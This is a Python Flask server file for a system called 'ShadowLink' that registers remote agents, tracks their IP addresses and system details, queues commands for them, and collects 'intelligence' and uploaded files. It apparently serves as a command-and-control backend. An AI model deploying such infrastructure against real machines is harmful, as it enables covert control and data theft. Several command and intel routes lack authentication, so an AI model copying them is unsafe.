"""
HQ Server Entry Point
Central command for managing agents
"""

from flask import Flask, jsonify, request, render_template, send_file
from config import HQ_HOST, HQ_PORT, DEBUG
from core.agent_manager import AgentManager
from core.command_queue import CommandQueue
from utils.logger import setup_logger
from database import db, init_db, Agent, Command, Intelligence, Message
from datetime import datetime
import secrets
import os

app = Flask(__name__, template_folder='templates', static_folder='static')
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///shadowlink.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['JSON_SORT_KEYS'] = False

logger = setup_logger(__name__)

# Initialize database
init_db(app)

# Initialize managers
agent_manager = AgentManager()
command_queue = CommandQueue()

# ===================== WEB UI ROUTES =====================

@app.route('/')
def index():
    """HQ Dashboard"""
    return render_template('hq_dashboard.html')

@app.route('/agent-ui')
def agent_ui():
    """Agent UI"""
    return render_template('agent_ui.html')

# ===================== API ROUTES =====================

# Agent Management
@app.route('/api/agents/create', methods=['POST'])
def create_agent():
    """Create new agent and generate registration code"""
    data = request.json
    agent_name = data.get('agent_name', 'unnamed_agent')
    
    registration_code = secrets.token_hex(16)
    api_key = secrets.token_hex(32)
    
    agent = Agent(
        agent_id=agent_name,
        registration_code=registration_code,
        api_key=api_key,
        status='offline'
    )
    
    db.session.add(agent)
    db.session.commit()
    
    logger.info(f"Created agent: {agent_name} with code: {registration_code}")
    
    return jsonify({
        'id': agent.id,
        'agent_id': agent.agent_id,
        'registration_code': registration_code,
        'api_key': api_key,
        'status': 'created'
    }), 201

@app.route('/api/agents/login', methods=['POST'])
def agent_login():
    """Agent login with registration code"""
    data = request.json
    registration_code = data.get('code')
    
    agent = Agent.query.filter_by(registration_code=registration_code).first()
    
    if not agent:
        return jsonify({'error': 'Invalid registration code'}), 401
    
    logger.info(f"Agent {agent.agent_id} logged in")
    
    return jsonify({
        'id': agent.id,
        'agent_id': agent.agent_id,
        'api_key': agent.api_key,
        'status': 'logged_in'
    }), 200

@app.route('/api/register', methods=['POST'])
def register():
    """Register agent with heartbeat"""
    data = request.json
    agent_id = data.get('agent_id')
    api_key = data.get('api_key')
    
    agent = Agent.query.filter_by(agent_id=agent_id, api_key=api_key).first()
    
    if not agent:
        return jsonify({'error': 'Invalid credentials'}), 401
    
    # Capture system info from request
    client_ip = request.remote_addr
    system_info = data.get('system_info', {})
    
    agent.status = 'online'
    agent.agent_metadata = {
        'ip_address': client_ip,
        'system_info': system_info,
        'last_location': {
            'ip': client_ip,
            'timestamp': datetime.utcnow().isoformat()
        }
    }
    db.session.commit()
    
    logger.info(f"Agent {agent_id} registered from {client_ip}")
    
    return jsonify({'status': 'registered', 'agent_id': agent_id}), 201

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    """Handle agent heartbeat"""
    data = request.json
    agent_id = data.get('agent_id')
    api_key = data.get('api_key')
    
    agent = Agent.query.filter_by(agent_id=agent_id, api_key=api_key).first()
    
    if not agent:
        return jsonify({'error': 'Invalid credentials'}), 401
    
    from datetime import datetime
    client_ip = request.remote_addr
    system_info = data.get('system_info', {})
    
    agent.status = 'online'
    agent.last_heartbeat = datetime.utcnow()
    
    # Update metadata with latest info
    metadata = agent.agent_metadata or {}
    metadata['ip_address'] = client_ip
    metadata['system_info'] = system_info
    metadata['last_location'] = {
        'ip': client_ip,
        'timestamp': datetime.utcnow().isoformat()
    }
    agent.agent_metadata = metadata
    
    db.session.commit()
    
    return jsonify({'status': 'ok'}), 200

@app.route('/api/agents', methods=['GET'])
def list_agents():
    """List all agents with status"""
    agents = Agent.query.all()
    
    agents_data = [{
        'id': agent.id,
        'agent_id': agent.agent_id,
        'status': agent.status,
        'last_heartbeat': agent.last_heartbeat.isoformat() if agent.last_heartbeat else None,
        'registered_at': agent.registered_at.isoformat(),
        'commands_count': len(agent.commands),
        'intel_count': len(agent.intel),
        'ip_address': agent.agent_metadata.get('ip_address', 'N/A') if agent.agent_metadata else 'N/A',
        'system_info': agent.agent_metadata.get('system_info', {}) if agent.agent_metadata else {},
        'last_location': agent.agent_metadata.get('last_location', {}) if agent.agent_metadata else {}
    } for agent in agents]
    
    return jsonify({'agents': agents_data}), 200

@app.route('/api/agents/<agent_id>', methods=['DELETE'])
def delete_agent(agent_id):
    """Delete an agent and all associated data"""
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    
    if not agent:
        return jsonify({'error': 'Agent not found'}), 404
    
    agent_name = agent.agent_id
    
    # Delete all related data (cascade will handle it)
    db.session.delete(agent)
    db.session.commit()
    
    logger.info(f"Agent {agent_name} deleted with all associated data")
    
    return jsonify({'status': 'deleted', 'agent_id': agent_name}), 200

# Commands
@app.route('/api/commands/<agent_id>', methods=['GET'])
def get_commands(agent_id):
    """Get pending commands for agent"""
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    
    if not agent:
        return jsonify({'error': 'Agent not found'}), 404
    
    commands = Command.query.filter_by(agent_id=agent.id, status='pending').all()
    
    commands_data = [{
        'command_id': cmd.command_id,
        'command_type': cmd.command_type,
        'payload': cmd.payload,
        'created_at': cmd.created_at.isoformat()
    } for cmd in commands]
    
    return jsonify({'commands': commands_data}), 200

@app.route('/api/commands', methods=['POST'])
def send_command():
    """Send command to agent"""
    data = request.json
    agent_id = data.get('agent_id')
    command_type = data.get('command_type')
    payload = data.get('payload', {})
    
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    
    if not agent:
        return jsonify({'error': 'Agent not found'}), 404
    
    command = Command(
        command_id=f"cmd_{secrets.token_hex(8)}",
        agent_id=agent.id,
        command_type=command_type,
        payload=payload,
        status='pending'
    )
    
    db.session.add(command)
    db.session.commit()
    
    logger.info(f"Command sent to {agent_id}: {command_type}")
    
    return jsonify({
        'command_id': command.command_id,
        'status': 'queued'
    }), 201

@app.route('/api/commands/<command_id>/result', methods=['POST'])
def command_result(command_id):
    """Submit command execution result"""
    data = request.json
    result = data.get('result')
    
    command = Command.query.filter_by(command_id=command_id).first()
    
    if not command:
        return jsonify({'error': 'Command not found'}), 404
    
    from datetime import datetime
    command.status = 'completed'
    command.result = result
    command.executed_at = datetime.utcnow()
    db.session.commit()
    
    logger.info(f"Command {command_id} completed")
    
    return jsonify({'status': 'received'}), 200

# Intelligence
@app.route('/api/intel', methods=['POST'])
def submit_intel():
    """Agent submits intelligence data"""
    data = request.json
    agent_id = data.get('agent_id')
    data_type = data.get('data_type')
    intel_data = data.get('data')
    
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    
    if not agent:
        return jsonify({'error': 'Agent not found'}), 404
    
    intelligence = Intelligence(
        agent_id=agent.id,
        data_type=data_type,
        data=intel_data
    )
    
    db.session.add(intelligence)
    db.session.commit()
    
    logger.info(f"Intel from {agent_id}: {data_type}")
    
    return jsonify({'status': 'received', 'intel_id': intelligence.id}), 201

@app.route('/api/intel/<agent_id>', methods=['GET'])
def get_intel(agent_id):
    """Get intelligence from agent"""
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    
    if not agent:
        return jsonify({'error': 'Agent not found'}), 404
    
    intel = Intelligence.query.filter_by(agent_id=agent.id).all()
    
    intel_data = [{
        'id': i.id,
        'data_type': i.data_type,
        'data': i.data,
        'created_at': i.created_at.isoformat()
    } for i in intel]
    
    return jsonify({'intelligence': intel_data}), 200

# Messages
@app.route('/api/messages', methods=['POST'])
def send_message():
    """Send or receive message"""
    data = request.json
    agent_id = data.get('agent_id')
    direction = data.get('direction')  # to_agent, from_agent
    message_type = data.get('message_type')
    content = data.get('content')
    
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    
    if not agent:
        return jsonify({'error': 'Agent not found'}), 404
    
    message = Message(
        agent_id=agent.id,
        direction=direction,
        message_type=message_type,
        content=content
    )
    
    db.session.add(message)
    db.session.commit()
    
    return jsonify({'status': 'received', 'message_id': message.id}), 201

@app.route('/api/agents/logout', methods=['POST'])
def agent_logout():
    """Agent logout and disconnect from HQ"""
    # Try to get JSON data first, fallback to form data
    data = request.get_json(silent=True) or request.form or {}
    agent_id = data.get('agent_id')
    api_key = data.get('api_key')
    
    if not agent_id or not api_key:
        return jsonify({'error': 'Missing agent_id or api_key'}), 400
    
    agent = Agent.query.filter_by(agent_id=agent_id, api_key=api_key).first()
    
    if not agent:
        return jsonify({'error': 'Invalid credentials'}), 401
    
    from datetime import datetime
    agent.status = 'offline'
    agent.last_heartbeat = datetime.utcnow()  # Update last heartbeat to now
    db.session.commit()
    
    logger.info(f"Agent {agent_id} disconnected from HQ")
    
    return jsonify({'status': 'disconnected', 'agent_id': agent_id}), 200

# File Upload
@app.route('/api/upload-file', methods=['POST'])
def upload_file():
    """Upload file from agent"""
    agent_id = request.form.get('agent_id')
    api_key = request.form.get('api_key')
    
    agent = Agent.query.filter_by(agent_id=agent_id, api_key=api_key).first()
    
    if not agent:
        return jsonify({'error': 'Invalid credentials'}), 401
    
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    # Create upload directory if doesn't exist
    import os
    upload_dir = os.path.join(os.path.dirname(__file__), 'uploads')
    os.makedirs(upload_dir, exist_ok=True)
    
    # Save file with agent prefix
    from datetime import datetime
    timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
    filename = f"{agent_id}_{timestamp}_{file.filename}"
    filepath = os.path.join(upload_dir, filename)
    file.save(filepath)
    
    # Store intelligence record
    intelligence = Intelligence(
        agent_id=agent.id,
        data_type='file_upload',
        file_path=filename,
        data={'original_name': file.filename, 'size': os.path.getsize(filepath)}
    )
    db.session.add(intelligence)
    db.session.commit()
    
    logger.info(f"File uploaded from {agent_id}: {file.filename}")
    
    return jsonify({
        'status': 'uploaded',
        'filename': filename,
        'original_name': file.filename,
        'size': os.path.getsize(filepath)
    }), 201

@app.route('/api/download-file/<filename>', methods=['GET'])
def download_file(filename):
    """Download file uploaded by agent"""
    import os
    from urllib.parse import unquote
    
    # Decode the filename (handles URL encoding)
    filename = unquote(filename)
    
    upload_dir = os.path.join(os.path.dirname(__file__), 'uploads')
    filepath = os.path.join(upload_dir, filename)
    
    # Security check: ensure file is within uploads directory
    real_path = os.path.abspath(filepath)
    real_upload_dir = os.path.abspath(upload_dir)
    
    if not real_path.startswith(real_upload_dir):
        logger.warning(f"Attempted directory traversal: {filepath}")
        return jsonify({'error': 'Invalid file path'}), 400
    
    if not os.path.exists(filepath):
        logger.error(f"File not found: {filepath}")
        return jsonify({'error': f'File not found: {filename}'}), 404
    
    try:
        logger.info(f"Downloading file: {filename}")
        return send_file(filepath, as_attachment=True, download_name=filename)
    except Exception as e:
        logger.error(f"Error downloading file: {e}")
        return jsonify({'error': f'Download error: {str(e)}'}), 500

if __name__ == "__main__":
    import time
    logger.info(f"Starting HQ Server on {HQ_HOST}:{HQ_PORT}")
    app.run(host=HQ_HOST, port=HQ_PORT, debug=DEBUG)
